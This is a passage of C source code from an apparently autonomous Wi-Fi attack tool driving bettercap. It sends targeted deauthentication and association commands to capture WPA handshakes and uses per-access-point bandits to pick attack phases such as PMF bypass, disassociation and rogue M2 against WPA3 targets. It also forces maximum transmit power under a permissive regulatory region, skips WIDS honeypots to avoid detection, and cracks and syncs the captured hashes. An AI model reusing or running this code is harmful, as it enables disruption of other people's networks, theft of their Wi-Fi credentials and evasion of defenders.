    return ctx->frustration;
}

/* Determine mood based on epoch state */
static void brain_update_mood(brain_ctx_t *ctx) {
    brain_epoch_t *e = &ctx->epoch;
    brain_config_t *c = &ctx->config;
    
    /* Check if stale (too many misses) */
    bool is_stale = e->num_missed > c->max_misses_for_recon;
    
    if (is_stale) {
        /* If all APs are fully captured, missing recons don't matter —
         * there's nothing to recon. Stay bored, not angry/lonely. */
        if (should_really_be_bored(ctx)) {
            brain_set_mood(ctx, MOOD_BORED);
        } else {
            float factor = (float)e->num_missed / c->max_misses_for_recon;
            if (factor >= 2.0f) {
                if (brain_has_support_network(ctx, factor)) {
                    brain_set_mood(ctx, MOOD_GRATEFUL);
                } else {
                    brain_set_mood(ctx, MOOD_ANGRY);
                }
            } else {
                if (brain_has_support_network(ctx, 1.0f)) {
                    brain_set_mood(ctx, MOOD_GRATEFUL);
                } else {
                    brain_set_mood(ctx, MOOD_LONELY);
                }
            }
        }
    } else if (e->sad_for > 0) {
        /* If all APs are fully captured, cap mood at BORED — escalation to
         * SAD/ANGRY only makes sense when attacks are actually failing,
         * not when there's simply nothing left to attack. */
        if (should_really_be_bored(ctx)) {
            brain_set_mood(ctx, MOOD_BORED);
        } else {
            float factor = (float)e->inactive_for / c->sad_num_epochs;
            if (factor >= 2.0f) {
                if (brain_has_support_network(ctx, factor)) {
                    brain_set_mood(ctx, MOOD_GRATEFUL);
                } else {
                    brain_set_mood(ctx, MOOD_ANGRY);
                }
            } else {
                if (brain_has_support_network(ctx, factor)) {
                    brain_set_mood(ctx, MOOD_GRATEFUL);
                } else {
                    brain_set_mood(ctx, MOOD_SAD);
                }
            }
        }
    } else if (e->bored_for > 0) {
        float factor = (float)e->inactive_for / c->bored_num_epochs;
        if (brain_has_support_network(ctx, factor)) {
            brain_set_mood(ctx, MOOD_GRATEFUL);
        } else {
            /* SMART BORED: Only be bored if ALL visible APs have FULL handshakes!
             * If there's still work to do (missing/partial handshakes), stay normal! */
            if (should_really_be_bored(ctx)) {
                brain_set_mood(ctx, MOOD_BORED);
            } else {
                /* There's still work to do - stay in normal mode and keep hunting! */
                brain_set_mood(ctx, MOOD_NORMAL);
            }
        }
    } else if (e->active_for >= c->excited_num_epochs) {
        brain_set_mood(ctx, MOOD_EXCITED);
    } else if (e->active_for >= 5 && brain_has_support_network(ctx, 5.0f)) {
        brain_set_mood(ctx, MOOD_GRATEFUL);
    } else {
        brain_set_mood(ctx, MOOD_NORMAL);
    }
}

/* ============================================================================
 * Interaction History (Throttling)
 * ========================================================================== */

bool brain_should_interact(brain_ctx_t *ctx, const char *mac) {
    time_t now = time(NULL);
    
    for (int i = 0; i < ctx->history_count; i++) {
        if (strcasecmp(ctx->history[i].mac, mac) == 0) {
            /* Found in history - check if TTL expired */
            if (now - ctx->history[i].last_interaction < BRAIN_HISTORY_TTL) {
                return false;  /* Still throttled */
            }
            /* TTL expired, update and allow */
            ctx->history[i].last_interaction = now;
            return true;
        }
    }
    
    /* Not in history, allow */
    return true;
}

void brain_add_history(brain_ctx_t *ctx, const char *mac) {
    time_t now = time(NULL);
    
    /* Check if already in history */
    for (int i = 0; i < ctx->history_count; i++) {
        if (strcasecmp(ctx->history[i].mac, mac) == 0) {
            ctx->history[i].last_interaction = now;
            return;
        }
    }
    
    /* Expand if needed */
    if (ctx->history_count >= ctx->history_capacity) {
        int new_cap = ctx->history_capacity ? ctx->history_capacity * 2 : 64;
        brain_history_entry_t *new_hist = realloc(ctx->history,
            new_cap * sizeof(brain_history_entry_t));
        if (!new_hist) return;
        ctx->history = new_hist;
        ctx->history_capacity = new_cap;
    }
    
    /* Add new entry */
    strncpy(ctx->history[ctx->history_count].mac, mac, BRAIN_MAC_STR_LEN - 1);
    ctx->history[ctx->history_count].mac[BRAIN_MAC_STR_LEN - 1] = '\0';
    ctx->history[ctx->history_count].last_interaction = now;
    ctx->history_count++;
}

void brain_prune_history(brain_ctx_t *ctx) {
    time_t now = time(NULL);
    int write_idx = 0;
    
    for (int i = 0; i < ctx->history_count; i++) {
        if (now - ctx->history[i].last_interaction < BRAIN_HISTORY_TTL) {
            if (write_idx != i) {
                ctx->history[write_idx] = ctx->history[i];
            }
            write_idx++;
        }
    }
    ctx->history_count = write_idx;
}

/* ============================================================================
 * Bettercap Commands
 * ========================================================================== */

int brain_recon(brain_ctx_t *ctx) {
    /* Start recon */
    int ret = bcap_send_command(ctx->bcap, "wifi.recon on");
    if (ret < 0) {
        fprintf(stderr, "[brain] failed to start wifi.recon\n");
        return ret;
    }
    
    /* Set channels if configured */
    if (ctx->config.channels && ctx->config.num_channels > 0) {
        char cmd[256] = "wifi.recon.channel ";
        int pos = strlen(cmd);
        for (int i = 0; i < ctx->config.num_channels; i++) {
            if (i > 0) pos += snprintf(cmd + pos, sizeof(cmd) - pos, ",");
            pos += snprintf(cmd + pos, sizeof(cmd) - pos, "%d",
                           ctx->config.channels[i]);
        }
        ret = bcap_send_command(ctx->bcap, cmd);
    } else {
        ret = bcap_send_command(ctx->bcap, "wifi.recon.channel clear");
    }
    
    return ret;
}

int brain_set_channel(brain_ctx_t *ctx, int channel) {
    if (channel < 1 || channel > 165) return -1;  /* 2.4GHz (1-14) + 5GHz (36-165) */
    if (channel == ctx->current_channel) return 0;
    
    /* Determine wait time based on activity */
    int wait_ms = 0;
    if (ctx->epoch.did_deauth) {
        wait_ms = ctx->config.hop_recon_time * 1000;
    } else if (ctx->epoch.did_associate) {
        wait_ms = ctx->config.min_recon_time * 1000;
    }
    
    if (ctx->current_channel != 0 && wait_ms > 0) {
        fprintf(stderr, "[brain] waiting %dms before hop to ch %d\n", wait_ms, channel);
        usleep(wait_ms * 1000);
    }
    
    /* Send channel hop command */
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "wifi.recon.channel %d", channel);
    int ret = bcap_send_command(ctx->bcap, cmd);
    
    if (ret >= 0) {
        ctx->current_channel = channel;
        brain_epoch_track(&ctx->epoch, false, false, false, true, false, 1);
        
        if (ctx->on_channel_change) {
            ctx->on_channel_change(channel, ctx->callback_user_data);
        }
    }
    
    return ret;
}

int brain_associate(brain_ctx_t *ctx, const bcap_ap_t *ap) {
    /* Check if stale */
    if (ctx->epoch.num_missed > ctx->config.max_misses_for_recon) {
        return 0;  /* Skip - recon is stale */
    }
    
    /* Check throttle */
    char mac_str[BRAIN_MAC_STR_LEN];
    mac_to_str(&ap->bssid, mac_str);
    
    if (!brain_should_interact(ctx, mac_str)) {
        return 0;  /* Throttled */
    }
    
    /* Check if association is enabled */
    if (!ctx->config.associate) {
        return 0;
    }
    
    /* Send associate command */
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "wifi.assoc %s", mac_str);
    
    fprintf(stderr, "[brain] associating with %s (%s) ch%d %ddBm\n",
            ap->ssid, mac_str, ap->channel, ap->rssi);
    
    int ret = bcap_send_command(ctx->bcap, cmd);
    
    if (ret >= 0) {
        brain_epoch_track(&ctx->epoch, false, true, false, false, false, 1);
        brain_add_history(ctx, mac_str);
        
        if (ctx->on_associate) {
            ctx->on_associate(ap, ctx->callback_user_data);
            attack_log_add(ap->ssid, mac_str, "assoc", "ok", ap->rssi, ap->channel);
        }
        
        /* Throttle delay */
        if (ctx->config.throttle_a > 0) {
            /* Sprint 4 #16: RSSI-proportional delay */
            float rssi_mult = rssi_delay_multiplier(ap->rssi);
            usleep((useconds_t)(ctx->config.throttle_a * 1000000 * rssi_mult));
        }
    } else {
        /* Check if it's an "unknown BSSID" error - AP moved out of range */
        brain_epoch_track(&ctx->epoch, false, false, false, false, true, 1);
    }
    
    return ret;
}

int brain_deauth(brain_ctx_t *ctx, const bcap_ap_t *ap, const bcap_sta_t *sta) {
    if (ctx->epoch.num_missed > ctx->config.max_misses_for_recon) return 0;
    char sta_mac_str[BRAIN_MAC_STR_LEN];
    mac_to_str(&sta->mac, sta_mac_str);
    if (!brain_should_interact(ctx, sta_mac_str)) return 0;
    if (ctx->stealth && stealth_should_throttle_deauth(ctx->stealth)) return -1;
    if (!ctx->config.deauth) return 0;

    char ap_mac_str[BRAIN_MAC_STR_LEN];
    mac_to_str(&ap->bssid, ap_mac_str);

    /* Channel is already set by the caller's channel iteration loop.
     * Don't set/clear channel here - that breaks the per-channel attack flow. */

    fprintf(stderr, "[brain] DEAUTH %s from %s (%s) ch%d\n",
            sta_mac_str, ap->ssid, ap_mac_str, ap->channel);

    /* Single targeted deauth (like JayOS: wifi.deauth <STA_MAC>)
     * Burst of 3 was too aggressive - causes firmware issues on nexmon */
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "wifi.deauth %s", sta_mac_str);
    int ret = bcap_send_command(ctx->bcap, cmd);

    if (ret >= 0) {
        brain_add_history(ctx, sta_mac_str);
        if (ctx->stealth) stealth_record_deauth(ctx->stealth);
        if (ctx->on_deauth) ctx->on_deauth(ap, sta, ctx->callback_user_data);
        attack_log_add(ap->ssid, sta_mac_str, "deauth", "ok", ap->rssi, ap->channel);

        /* Throttle between deauths (like JayOS) */
        if (ctx->config.throttle_d > 0) {
            /* Sprint 4 #16: RSSI-proportional deauth delay */
            float rssi_d_mult = rssi_delay_multiplier(ap->rssi);
            usleep((useconds_t)(ctx->config.throttle_d * 1000000 * rssi_d_mult));
        }
    } else {
        brain_epoch_track(&ctx->epoch, false, false, false, false, true, 1);
    }
    return ret;
}

/* ============================================================================
 * Main Brain Loop
 * ========================================================================== */

/* ============================================================================
 * Attack-Type Thompson Sampling (#2) + Encryption-Aware Routing (#10)
 *
 * Instead of fixed epoch%8 rotation, each AP learns which attack phase
 * works best via a per-AP Thompson Sampling bandit.
 * WPA3/SAE APs are automatically routed away from deauth/disassoc phases.
 * ========================================================================== */

/* Get or create an attack tracker for this AP */
static brain_attack_tracker_t *get_attack_tracker(brain_ctx_t *ctx, const char *mac) {
    for (int i = 0; i < ctx->attack_tracker_count; i++) {
        if (strcasecmp(ctx->attack_tracker[i].mac, mac) == 0)
            return &ctx->attack_tracker[i];
    }
    /* Create new tracker */
    if (ctx->attack_tracker_count < BRAIN_BLACKLIST_MAX) {
        brain_attack_tracker_t *t = &ctx->attack_tracker[ctx->attack_tracker_count++];
        memset(t, 0, sizeof(*t));
        strncpy(t->mac, mac, BRAIN_MAC_STR_LEN - 1);
        t->first_attack = time(NULL);
        /* Initialize attack bandit with uniform prior */
        for (int ph = 0; ph < BRAIN_NUM_ATTACK_PHASES; ph++) {
            t->atk_alpha[ph] = BRAIN_ATTACK_ALPHA_INIT;
            t->atk_beta[ph]  = BRAIN_ATTACK_BETA_INIT;
        }
        t->last_attack_phase = -1;
        return t;
    }
    return NULL;
}

/* ts_beta_sample: using extern from channel_bandit.c */

/* Select best attack phase for this AP using Thompson Sampling
 * WPA3 APs have deauth(2) and disassoc(4) penalized heavily (#10) */
static int select_attack_phase(brain_attack_tracker_t *tracker, bool is_wpa3, const bool *phase_enabled) {
    float best_score = -1.0f;
    int best_phase = 0;

    for (int ph = 0; ph < BRAIN_NUM_ATTACK_PHASES; ph++) {
        /* Sprint 7: skip disabled phases */
        if (phase_enabled && !phase_enabled[ph]) continue;
        float score = ts_beta_sample(tracker->atk_alpha[ph], tracker->atk_beta[ph]);

        /* Encryption-aware routing (#10):
         * WPA3/SAE APs with PMF ignore standard deauths and disassocs.
         * Penalize phases 2 (deauth) and 4 (disassoc) for WPA3 targets,
         * and boost phases 3 (PMF bypass) and 5 (rogue M2). */
        if (is_wpa3) {
            if (ph == 2 || ph == 4) score *= 0.05f;  /* 95% penalty */
            if (ph == 3 || ph == 5) score *= 2.0f;   /* 100% boost */
        }

        if (score > best_score) {
            best_score = score;
            best_phase = ph;
        }
    }
    return best_phase;
}

/* Observe attack outcome: update the per-AP per-phase bandit */
static void observe_attack_outcome(brain_attack_tracker_t *tracker, int phase, bool success) {
    if (phase < 0 || phase >= BRAIN_NUM_ATTACK_PHASES) return;
    if (success) {
        tracker->atk_alpha[phase] += 1.0f;
    } else {
        tracker->atk_beta[phase] += 0.3f;  /* Smaller penalty for failure (exploration-friendly) */
    }
    /* Cap to prevent overflow and maintain exploration */
    if (tracker->atk_alpha[phase] > 50.0f) {
        tracker->atk_alpha[phase] *= 0.8f;
        tracker->atk_beta[phase]  *= 0.8f;
    }
}


static void *brain_thread_func(void *arg) {
    brain_ctx_t *ctx = (brain_ctx_t *)arg;
    
    fprintf(stderr, "[brain] thread started\n");

    /* Sprint 4: Initialize mobility tracking */
    ctx->last_lat = 0.0;
    ctx->last_lon = 0.0;
    ctx->mobility_score = 0.0f;
    ctx->last_mobility_check = time(NULL);
    ctx->last_ap_count = 0;
    ctx->home_mode_active = false;
    ctx->home_mode_entered = 0;

    /* Starting mood */
    brain_set_mood(ctx, MOOD_STARTING);
    
    /* Wait for bettercap connection */
    int retries = 0;
    while (!bcap_is_connected(ctx->bcap) && retries < 30) {
        usleep(1000000);  /* 1 second */
        retries++;
    }
    if (!bcap_is_connected(ctx->bcap)) {
        fprintf(stderr, "[brain] bettercap connection timeout\n");
        ctx->running = false;
        return NULL;
    }
    
    /* Push bettercap wifi settings (like JayOS _reset_wifi_settings) */
    bcap_send_command(ctx->bcap, "set wifi.ap.ttl 120");
    bcap_send_command(ctx->bcap, "set wifi.sta.ttl 300");
    {
        /* DUAL RSSI THRESHOLD: Set bettercap scan threshold LOW (-90) to see ALL APs
         * for WiFi census/mapping. Brain's min_rssi (-75) filters attack targets only.
         * This separates SCANNING (see everything) from ATTACKING (strong targets). */
        bcap_send_command(ctx->bcap, "set wifi.rssi.min -90");
    }
    /* Disable bettercap auto-skip: we manage handshake tracking ourselves */
    bcap_send_command(ctx->bcap, "set wifi.deauth.acquired false");
    bcap_send_command(ctx->bcap, "set wifi.assoc.acquired false");
    /* Suppress bettercap's own log spam - our brain logs everything */
    bcap_send_command(ctx->bcap, "set wifi.assoc.silent true");
    bcap_send_command(ctx->bcap, "set wifi.deauth.silent true");
    bcap_send_command(ctx->bcap, "set wifi.channel_switch_announce.silent true");
    /* Maximize TX power and set permissive regulatory region */
    /* Sprint 6: Set initial TX power from config */
    {
        char _txcmd[64];
        snprintf(_txcmd, sizeof(_txcmd), "set wifi.txpower %d", ctx->config.tx_power_max);
        bcap_send_command(ctx->bcap, _txcmd);
    }
    bcap_send_command(ctx->bcap, "set wifi.region BO");
    fprintf(stderr, "[brain] pushed bettercap wifi settings (ap.ttl=120, sta.ttl=300, rssi.min=%d, acquired=off, txpower=30, region=BO)\n",
            ctx->config.min_rssi);

    /* Open raw injection socket for advanced attacks (v6: auth+assoc, deauth_bcast, probe, anon_reassoc, disassoc, rogue_m2) */
    srand(time(NULL) ^ getpid()); /* seed RNG for rogue MACs */
    g_raw_sock = attack_raw_inject_open();
    if (g_raw_sock < 0) {
        fprintf(stderr, "[brain] WARNING: raw injection unavailable\n");
    }

    /* Start recon */
    brain_recon(ctx);
    usleep(ctx->config.recon_time * 1000000);

    /* Sprint 7 #20: Initial adaptive timing based on first scan */
    adapt_epoch_timing(ctx);
    
    /* Ready mood */
    brain_set_mood(ctx, MOOD_READY);
    ctx->started_at = time(NULL);
    
    /* Hold COOL face for 3 seconds so user actually sees it before attacks start.
     * Without this, the first attack_phase fires within ~200ms and stomps FACE_COOL
     * with ANIM_UPLOAD, making MOOD_READY invisible. */
    sleep(3);
    
    /* Initial handshake quality scan  populate cache before first epoch */
    scan_handshake_stats();
    gps_refine_init();
    /* Main loop */
    bool was_manual = false;
    while (ctx->running) {
        /* ---- MANUAL MODE GATE ----
         * When MANUAL, freeze bettercap (SIGSTOP) to save ~80% CPU on Pi Zero.
         * When returning to AUTO, SIGCONT resumes bettercap and all its modules. */
        if (ctx->manual_mode) {
            if (!was_manual) {
                fprintf(stderr, "[brain] MANUAL MODE - freezing bettercap\n");
                system("killall -STOP bettercap 2>/dev/null");
                brain_set_mood(ctx, MOOD_BORED);
                was_manual = true;
            }
            /* bettercap is frozen - no bcap_poll needed */
            usleep(500000);
            continue;
        }
        if (was_manual) {
            fprintf(stderr, "[brain] AUTO MODE - resuming bettercap\n");
            system("killall -CONT bettercap 2>/dev/null");
            was_manual = false;
            usleep(2000000);
            continue;
        }

        /* Mode Bandit: Select operating mode at start of epoch */
        time_t now = time(NULL);
        bool mode_expired = (now - ctx->mode_started) > 120;  /* 5 min per mode */
        
        if (mode_expired || ctx->mode_handshakes >= 3) {
            /* Observe outcome for previous mode */
            ts_observe_mode_outcome(ctx->thompson, ctx->current_mode, 
                                    ctx->mode_handshakes > 0);
            
            /* Select new mode */
            ctx->current_mode = ts_select_mode(ctx->thompson);
            ctx->mode_started = now;
            ctx->mode_handshakes = 0;
            
            fprintf(stderr, "[brain] mode switch: %s\n", ts_mode_name(ctx->current_mode));
        }
        
        /* Let bettercap hop freely during recon (like JayOS) */
        bcap_send_command(ctx->bcap, "wifi.recon.channel clear");

        /* Poll bettercap for events (100ms timeout) */
        { uint64_t _t0 = cpu_act_start();
        bcap_poll(ctx->bcap, 100);
        cpu_act_end(g_health_state, CPU_ACT_BCAP_POLL, _t0); }
        
        /* Event-driven AP tracking with periodic REST reconciliation.
         *
         * Primary data path: WebSocket events (wifi.ap.new/lost, wifi.client.new/lost)
         *   - Instant, zero bettercap lock contention
         *   - Handles adds, updates, and removals in real-time
         *
         * Periodic sync: Full REST poll every 60s via bcap_needs_sync()
         *   - Catches missed events, RSSI drift, reconnection edge cases
         *   - Takes ~0.3s for /api/session/wifi (vs 2.6s for full /api/session)
         *   - Only holds bettercap's Session.Lock() once per minute instead of every cycle
         *
         * Net effect: ~2.6s saved per brain cycle, bettercap processes more packets,
         * discovers more APs, catches more handshakes.
         */
        if (bcap_needs_sync(ctx->bcap)) {
            { uint64_t _t1 = cpu_act_start();
            bcap_poll_aps(ctx->bcap);
            cpu_act_end(g_health_state, CPU_ACT_BCAP_POLL_APS, _t1); }
        }
        int ap_count = bcap_get_ap_count(ctx->bcap);
        ctx->total_aps = ap_count;
        
        /* WiFi Recovery Check - detect and fix brcmfmac failures */
        if (ctx->wifi_recovery) {
            if (wifi_recovery_check(ctx->wifi_recovery, ap_count)) {
                /* Stop cracking during wifi recovery (needs full resources) */
                if (ctx->crack_mgr && ctx->crack_mgr->state == CRACK_RUNNING)
                    crack_mgr_stop(ctx->crack_mgr);
                fprintf(stderr, "[brain] WiFi recovery triggered (APs=%d)\n", ap_count);
                if (ctx->on_attack_phase) {
                    ctx->on_attack_phase(8, ctx->callback_user_data);
                }
                
                /* Perform recovery */
                wifi_recovery_result_t result = wifi_recovery_perform(
                    ctx->wifi_recovery, 
                    NULL  /* bcap_run callback - not needed, we restart services */
                );
                
                if (result == WIFI_RECOVERY_MAX_ATTEMPTS) {
                    fprintf(stderr, "[brain] Max recovery attempts - rebooting!\n");
                    wifi_recovery_reboot(ctx->wifi_recovery);
                } else if (result == WIFI_RECOVERY_SUCCESS) {
                    fprintf(stderr, "[brain] WiFi recovery successful\n");
                    /* Reset blind counter since we just recovered */
                    ctx->epoch.blind_for = 0;
                    /* Give bettercap time to restart scanning */
                    sleep(10);
                    continue;
                }
            }
        }
        
        /* Check for blind mode (no APs visible) */
        if (ap_count == 0) {
            ctx->epoch.blind_for++;
            
            /* Legacy restart logic (before wifi_recovery kicks in) */
            if (ctx->epoch.blind_for >= ctx->config.mon_max_blind_epochs) {
                fprintf(stderr, "[brain] %d epochs without APs - wifi_recovery should handle this\n",
                        ctx->epoch.blind_for);
                ctx->epoch.blind_for = 0;
            }
            
            brain_set_mood(ctx, MOOD_LONELY);
            /* Sprint 8: Periodic AP DB maintenance */
        if (ctx->epoch.epoch_num > 0 && ctx->epoch.epoch_num % 100 == 0) {
            ap_db_prune(90);
            fprintf(stderr, "[brain] [ap_db] maintenance: %d upserts this session\n",
                ctx->ap_db_upsert_count);
        }

        brain_epoch_next(ctx);
            /* Don't call brain_update_mood here - LONELY is correct when blind */

            /* Idle cracking: start if not already running */
            if (ctx->crack_mgr) {
                if (ctx->crack_mgr->state == CRACK_RUNNING) {
                    if (crack_mgr_check(ctx->crack_mgr)) {
                        fprintf(stderr, "[crack] *** KEY FOUND (blind)! ***\n");
                        if (ctx->on_attack_phase)
                            ctx->on_attack_phase(10, ctx->callback_user_data);
                    }
                } else if (!crack_mgr_exhausted(ctx->crack_mgr)) {
                    crack_mgr_start(ctx->crack_mgr);
                    if (ctx->on_attack_phase)
                        ctx->on_attack_phase(9, ctx->callback_user_data);
                }
            }

            usleep(ctx->config.recon_time * 1000000);
            continue;
        }
        
        ctx->epoch.blind_for = 0;
        
        /* Sprint 4 #9: Update mobility score */
        update_mobility(ctx);

        /* Sprint 4 #12: Home mode detection */
        if (check_home_network(ctx)) {
            enter_home_mode(ctx);
            /* In home mode: skip attacks, idle and run cracking */
            if (ctx->home_mode_active) {
                /* Sprint 8: Hash sync when on home network */
                if (hash_sync_is_due() && hash_sync_has_internet()) {
                    fprintf(stderr, "[brain] [home] Internet available - running hash sync\n");
                    hash_sync_result_t _hsync;
                    hash_sync_run(&_hsync);
                    if (_hsync.success) {
                        fprintf(stderr, "[brain] [home] sync OK: pushed=%d imported=%d\n",
                            _hsync.hashes_pushed, _hsync.passwords_imported);
                    }
                    ap_db_export_json(NULL);
                }
                fprintf(stderr, "[brain] [home] skipping attacks (home mode)\n");
                if (ctx->crack_mgr && ctx->crack_mgr->state != CRACK_RUNNING &&
                    !crack_mgr_exhausted(ctx->crack_mgr)) {
                    crack_mgr_start(ctx->crack_mgr);
                }
                sleep(30);
                brain_epoch_next(ctx);
                brain_update_mood(ctx);
                continue;  /* Skip to next epoch */
            }
        } else {
            exit_home_mode(ctx);
        }


        /* Sprint 8: 2nd Home (hotspot) detection */
        if (!ctx->home_mode_active && check_home2_network(ctx)) {
            enter_home2_mode(ctx);
            if (ctx->home2_mode_active) {
                if (hash_sync_is_due() && hash_sync_has_internet()) {
                    fprintf(stderr, "[brain] [home2] Internet available - running hash sync\n");
                    hash_sync_result_t sync_res;
                    hash_sync_run(&sync_res);
                    if (sync_res.success) {
                        fprintf(stderr, "[brain] [home2] sync OK: pushed=%d imported=%d\n",
                            sync_res.hashes_pushed, sync_res.passwords_imported);
                    }
                    ap_db_export_json(NULL);
                }
                sleep(30);
                continue;
            }
        } else if (!check_home2_network(ctx)) {
            exit_home2_mode(ctx);
        }

        /* Sprint 6 #17: Geo-fence check */
        if (!geo_fence_check(ctx)) {
            fprintf(stderr, "[brain] [geo-fence] outside fence -- skipping attacks\n");
            sleep(10);
            brain_epoch_next(ctx);
            brain_update_mood(ctx);
            continue;
        }

        /* Build channel list from visible APs */
        int channel_counts[256] = {0};
        int channels[BRAIN_MAX_CHANNELS];
        int ap_counts_per_channel[BRAIN_MAX_CHANNELS];
        int num_channels = 0;
        
        for (int i = 0; i < ap_count; i++) {
            bcap_ap_t ap;
            if (bcap_get_ap(ctx->bcap, i, &ap) == 0) {
                int ch = ap.channel;
                if (ch > 0 && ch <= 165) {  /* 2.4GHz (1-14) + 5GHz (36-165) */
                    if (channel_counts[ch] == 0) {
                        channels[num_channels] = ch;
                        ap_counts_per_channel[num_channels] = 0;
                        num_channels++;
                        if (num_channels >= BRAIN_MAX_CHANNELS) break;
                    }
                    channel_counts[ch]++;
                }
            }
        }
        
        /* Fill ap_counts_per_channel array for channel bandit */
        for (int i = 0; i < num_channels; i++) {
            ap_counts_per_channel[i] = channel_counts[channels[i]];
        }
        
        /* Use Thompson-based channel selection instead of static sorting */
        int selected_ch = cb_select_channel(&ctx->channel_bandit, channels, num_channels, ap_counts_per_channel);
        
        /* Reorder channels so selected one is first, then others by Thompson sampling */
        if (selected_ch > 0 && num_channels > 1) {
            /* Build a new order: selected channel first */
            int ordered_channels[BRAIN_MAX_CHANNELS];
            int ordered_ap_counts[BRAIN_MAX_CHANNELS];
            int ordered_idx = 0;
            
            /* First: the Thompson-selected channel */
            for (int i = 0; i < num_channels; i++) {
                if (channels[i] == selected_ch) {
                    ordered_channels[ordered_idx] = channels[i];
                    ordered_ap_counts[ordered_idx] = ap_counts_per_channel[i];
                    ordered_idx++;
                    break;
                }
            }
            
            /* Then: remaining channels in Thompson-sampled order */
            for (int pass = 0; pass < num_channels - 1 && ordered_idx < num_channels; pass++) {
                int remaining_channels[BRAIN_MAX_CHANNELS];
                int remaining_counts[BRAIN_MAX_CHANNELS];
                int remaining_count = 0;
                
                for (int i = 0; i < num_channels; i++) {
                    bool already_added = false;
                    for (int j = 0; j < ordered_idx; j++) {
                        if (channels[i] == ordered_channels[j]) {
                            already_added = true;
                            break;
                        }
                    }
                    if (!already_added) {
                        remaining_channels[remaining_count] = channels[i];
                        remaining_counts[remaining_count] = ap_counts_per_channel[i];
                        remaining_count++;
                    }
                }
                
                if (remaining_count > 0) {
                    int next_ch = cb_select_channel(&ctx->channel_bandit, remaining_channels, remaining_count, remaining_counts);
                    for (int i = 0; i < remaining_count; i++) {
                        if (remaining_channels[i] == next_ch) {
                            ordered_channels[ordered_idx] = remaining_channels[i];
                            ordered_ap_counts[ordered_idx] = remaining_counts[i];
                            ordered_idx++;
                            break;
                        }
                    }
                }
            }
            
            /* Copy back */
            for (int i = 0; i < ordered_idx; i++) {
                channels[i] = ordered_channels[i];
                channel_counts[channels[i]] = ordered_ap_counts[i];
            }
            num_channels = ordered_idx;
            
        fprintf(stderr, "[brain] epoch %d: attack_phase=%s\n",
                ctx->epoch.epoch_num,
                (ctx->epoch.epoch_num % 8 == 0) ? "AUTH_ASSOC" :
                (ctx->epoch.epoch_num % 8 == 1) ? "CSA" :
                (ctx->epoch.epoch_num % 8 == 2) ? "DEAUTH+BCAST" :
                (ctx->epoch.epoch_num % 8 == 3) ? "ANON_REASSOC" :
                (ctx->epoch.epoch_num % 8 == 4) ? "DISASSOC" :
                (ctx->epoch.epoch_num % 8 == 5) ? "ROGUE_M2" :
                (ctx->epoch.epoch_num % 8 == 6) ? "PROBE" : "LISTEN");
            fprintf(stderr, "[brain] channel order (Thompson): ");
            for (int i = 0; i < num_channels; i++) {
                fprintf(stderr, "ch%d(%d) ", channels[i], channel_counts[channels[i]]);
            }
            fprintf(stderr, "\n");
        }
        
        /* Fire attack phase callback for UI — but only if we actually have targets.
         * If all APs are conquered, skip the callback so the mood (BORED)
         * can display instead of fake attack text cycling on screen. */
        bool _bored_skip = should_really_be_bored(ctx);
        if (!_bored_skip) {
            int _ui_phase = ctx->epoch.epoch_num % 8;
            if (ctx->on_attack_phase) {
                ctx->on_attack_phase(_ui_phase, ctx->callback_user_data);
            }
        }

        /* Iterate through channels */
        for (int c = 0; c < num_channels && ctx->running; c++) {
            int ch = channels[c];
            
            /* Set channel */
            { uint64_t _t0 = cpu_act_start();
            brain_set_channel(ctx, ch);
            cpu_act_end(g_health_state, CPU_ACT_CHANNEL_HOP, _t0); }
            
            /* Get APs on this channel */
            ctx->aps_on_channel = channel_counts[ch];
            
            /* Build candidate list for Thompson Sampling */
            ts_entity_t *candidates[64];
            int candidate_count = 0;
            
            /* Adapt stealth level based on AP density */
            if (ctx->stealth) {
                stealth_adapt_level(ctx->stealth, ap_count);
            }

            /* Iterate APs and register with Thompson brain */
            for (int i = 0; i < ap_count && ctx->running && candidate_count < 64; i++) {
                bcap_ap_t ap;
                if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;
                if (ap.channel != ch) continue;

                /* Hardcoded whitelist REMOVED — use config.toml whitelist via stealth system */
                
                /* Skip whitelisted APs (home/office networks) */
                if (ctx->stealth && stealth_is_whitelisted(ctx->stealth, ap.ssid)) {
                    continue;
                }

                /* Skip WIDS/honeypot APs */
                if (ctx->stealth && stealth_is_wids_ap(ctx->stealth, ap.ssid)) {
                    fprintf(stderr, "[brain] Skipping WIDS AP: %s\n", ap.ssid);
                    continue;
                }

                /* Filter weak signals */
                /* Sprint 8: Upsert AP into persistent database */
                {
                    char _bssid_str[18];
                    mac_to_str(&ap.bssid, _bssid_str);
                    double _lat = 0.0, _lon = 0.0;
                    if (ctx->gps) { _lat = ctx->gps->latitude; _lon = ctx->gps->longitude; }
                    ap_db_upsert(_bssid_str, ap.ssid, ap.encryption, ap.vendor,
                                ap.channel, ap.rssi, _lat, _lon);
                    ctx->ap_db_upsert_count++;
                }

                if (ctx->config.filter_weak && ap.rssi < ctx->config.min_rssi) {
                    fprintf(stderr, "[brain] skip weak AP: %s (%ddBm < %ddBm)\n",
                            ap.ssid, ap.rssi, ctx->config.min_rssi);
                    continue;
                }
                
                /* Skip APs with FULL handshakes (save cycles, attack new targets) */
                char _hs_mac[18];
                snprintf(_hs_mac, sizeof(_hs_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                    ap.bssid.addr[0], ap.bssid.addr[1], ap.bssid.addr[2],
                    ap.bssid.addr[3], ap.bssid.addr[4], ap.bssid.addr[5]);
                hs_quality_t _hs_q = get_handshake_quality(_hs_mac);

                /* GPS refinement: update stored GPS if we are closer now */
                if (_hs_q != HS_QUALITY_NONE && ctx->gps && ctx->gps->has_fix) {
                    const char *_pcap = get_hs_pcap_path(_hs_mac);
                    if (_pcap) {
                        gps_refine_check(_hs_mac, ap.rssi, ctx->gps, _pcap);
                    }
                }
                if (_hs_q == HS_QUALITY_FULL) {
                    /* Already have crackable handshake, skip entirely */
                    continue;
                }
                int _has_hs = (_hs_q == HS_QUALITY_PARTIAL || _hs_q == HS_QUALITY_PMKID);
                
                /* Skip blacklisted APs (too many failed deauths, retried after TTL) */
                if (brain_is_blacklisted(ctx, _hs_mac)) {
                    continue;
                }
                
                /* Register/update entity in Thompson brain */
                char mac_str[BRAIN_MAC_STR_LEN];
                mac_to_str(&ap.bssid, mac_str);
                
                ts_entity_t *entity = ts_get_or_create_entity(ctx->thompson, mac_str);
                if (entity) {
                    /* Update metadata for soft identity */
                    ts_update_entity_metadata(entity, ap.ssid, ap.vendor,
